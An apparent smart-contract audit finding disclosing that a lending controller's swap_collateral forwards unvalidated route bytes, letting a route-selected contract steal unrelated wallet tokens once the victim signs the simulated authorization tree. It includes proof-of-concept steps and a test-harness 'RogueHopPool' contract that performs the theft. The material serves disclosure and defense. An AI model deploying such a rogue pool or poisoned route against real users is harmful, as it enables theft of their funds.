### Title
Route-selected contract can execute code under the caller's authorization and steal unrelated wallet funds - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral` accepts opaque caller-supplied route bytes and forwards them to the configured swap router without validating which contracts the route invokes. A malicious route can place attacker-controlled code on the call stack beneath the victim's `swap_collateral` authorization; if the victim signs the authorization tree returned by simulation, that code can transfer unrelated tokens from the victim's wallet to the attacker. [1](#0-0) [2](#0-1) 

### Finding Description
`swap_collateral` authenticates the caller and verifies control of the account before withdrawing collateral and routing it through `swap_tokens`. [3](#0-2)  The shared swap helper only requires non-empty bytes, authorizes one exact controller-to-router input transfer, invokes `execute_strategy(..., swap)`, and then checks the controller's input/output balance deltas. [4](#0-3) 

Those checks bound the controller's routed input, but they do not constrain the contract addresses embedded in the route. The repository's threat model states that the router invokes payload-selected pools and tokens without an allowlist, and that a pool can therefore run below the caller's authorization. [5](#0-4)  The regression fixture demonstrates the resulting authorization shape: a route-selected `RogueHopPool` calls `token.transfer(victim, attacker, amount)` for an unrelated wallet token. [6](#0-5) 

### Impact Explanation
A victim that signs the simulated authorization tree loses unrelated wallet funds, not merely the routed collateral. The test records the rogue transfer as a child of the victim's `swap_collateral` authorization and observes the victim's entire unrelated-token balance move to the attacker. [7](#0-6)  Enforced authorization then executes the same theft whenever the returned poisoned tree is signed. [8](#0-7) 

### Likelihood Explanation
The attacker does not need any protocol role or access to the victim's account; they only need the victim to submit a malicious route through `swap_collateral`, `multiply`, `swap_debt`, or `repay_debt_with_collateral`. Success depends on the victim signing an authorization tree containing the extra transfer, which is plausible when clients or wallets do not decode and enforce an exact expected child-authorization set. [9](#0-8) 

### Recommendation
Do not allow route bytes used by lending strategies to select arbitrary venue contracts. Enforce a governance-managed allowlist of permitted pool contracts in the swap router, or replace the opaque route bytes with a decoded controller/router interface that validates every venue address before invocation. Until contract-level validation exists, every client must simulate the complete transaction and reject any caller authorization tree containing children beyond the exact expected token pull. [10](#0-9) [2](#0-1) 

### Proof of Concept
1. Attacker deploys a pool contract whose venue callback executes `token::transfer(victim, attacker, victim_balance)` for a token unrelated to the lending position. [6](#0-5) 
2. Attacker encodes a route whose pool address is that malicious contract and returns a fair-looking output quote.
3. The victim invokes `swap_collateral(victim, account_id, usdc_key, amount, eth_key, malicious_route)`.
4. The controller authorizes only its exact input transfer and forwards the opaque route to the router. [11](#0-10) 
5. During route execution, the malicious pool requests the unrelated token transfer; simulation records it as a child of the victim's `swap_collateral` authorization. [12](#0-11) 
6. If the victim signs that simulated tree, the unrelated balance is transferred to the attacker while the lending swap can still complete successfully. [8](#0-7)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L21-54)
```rust
    require_positive_amount(env, amount_in);
    assert_with_error!(env, !swap.is_empty(), GenericError::InvalidPayments);

    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-71)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-269)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```
